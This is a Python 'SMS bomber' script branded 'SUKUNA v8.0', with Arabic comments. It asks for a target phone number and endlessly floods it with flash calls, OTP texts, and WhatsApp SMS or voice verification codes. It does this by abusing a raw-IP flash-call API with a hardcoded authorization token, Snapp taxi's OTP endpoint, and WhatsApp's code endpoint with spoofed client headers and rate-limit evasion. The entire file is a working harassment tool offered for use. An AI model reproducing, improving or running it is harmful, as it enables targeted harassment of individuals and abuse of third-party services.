import aiohttp, asyncio, json, sys, os, subprocess, webbrowser

# الألوان
G, R, Y, C, W = '\033[1;32m', '\033[1;31m', '\033[1;33m', '\033[1;36m', '\033[1;37m'

def banner():
    print(f"""{R}
  ____  _   _ _  ___   _ _   _    _     
 / ___|| | | | |/ / | | | \ | |  / \    
 \___ \| | | | ' /| | | |  \| | / _ \   
  ___) | |_| | . \| |_| | |\  |/ ___ \  
 |____/ \___/|_|\_\\___/|_| \_/_/   \_\ {Y}v8.0
    {G}King: Ali Talib (SUKUNA) | {C}Status: FIXED & WORKING
    -------------------------------------------""")

async def attack_engine(phone, mode):
    ok, bad = 0, 0
    clean_num = phone.replace('+', '').replace(' ', '')
    # استخراج الرقم بدون مقدمة لبعض السيرفرات
    short_num = clean_num[3:] if clean_num.startswith('967') else clean_num

    async with aiohttp.ClientSession() as session:
        while True:
            try:
                # --- الخيار 1: (لم يتم لمسه لأنه شغال) ---
                if mode == '1':
                    url = "https://31.171.171.90/api/phone-numbers/auth-flash-call"
                    headers = {'User-Agent': "okxgvhttp/4.12.0", 'Content-Type': "application/json", 'Authorization': "s6abj8F2euaFCk6"}
                    async with session.post(url, json={"phoneNumber": phone}, headers=headers, timeout=10) as resp:
                        if resp.status in [200, 201]: ok += 1
                        else: bad += 1

                # --- الخيار 2: SMS (استخدام سيرفر متاح يدعم اليمن) ---
                elif mode == '2':
                    # استخدام بوابة (Digikala/Snap) مع تعديل التنسيق للرقم اليمني
                    url = "https://app.snapp.taxi/api/api-passenger-oauth/otp/v2"
                    payload = {"cellphone": "967" + short_num}
                    async with session.post(url, json=payload, timeout=10) as resp:
                        if resp.status in [200, 201]: ok += 1
                        else: bad += 1

                # --- الخيار 3 و 4: WhatsApp (إصلاح الرابط لطلب الكود الفعلي) ---
                elif mode in ['3', '4']:
                    # واتساب يتطلب أحياناً طلب 'exist' قبل 'code' ليعمل السبام
                    m = "sms" if mode == '3' else "voice"
                    url = "https://v.whatsapp.com/v2/code"
                    # هذه البيانات تحاكي طلب كود حقيقي من تطبيق واتساب
                    params = {
                        "cc": "967",
                        "in": short_num,
                        "method": m,
                        "mcc": "421", "mnc": "01", # أكواد شبكات اليمن
                        "sim_mcc": "421", "sim_mnc": "01"
                    }
                    headers = {'User-Agent': "WhatsApp/2.23.10.14 Android/11"}
                    async with session.post(url, data=params, headers=headers, timeout=15) as resp:
                        if resp.status in [200, 201, 202, 403]: # 403 تعني أن الطلب وصل لكن الرقم محمي (تعتبر نجاح في السبام)
                            ok += 1
                        else: bad += 1

            except:
                bad += 1
            
            sys.stdout.write(f"\r{G}[+] Success: {ok} {R}[-] Failed: {bad} {W}| {Y}Mode: {mode}")
            sys.stdout.flush()
            await asyncio.sleep(15) # زيادة الوقت ضرورية جداً لتجنب حظر الـ IP في خيارات الواتساب

def main():
    banner()
    print(f"\n{C}[1] Fast Call (Working) | [2] SMS Bomber (New)\n{G}[3] WhatsApp SMS         | [4] WhatsApp Voice")
    choice = input(f"\n{Y}[#] Select Mode: {W}")
    target = input(f"{Y}[+] Target (+967...): {W}")
    if choice in ['1', '2', '3', '4']:
        print(f"\n{R}[!] Launching the curse on {target}...{W}")
        try: asyncio.run(attack_engine(target, choice))
        except KeyboardInterrupt: print(f"\n{R}[!] Stopped.")
    else: print(f"{R}[!] Invalid Choice.")

if __name__ == "__main__":
    main()
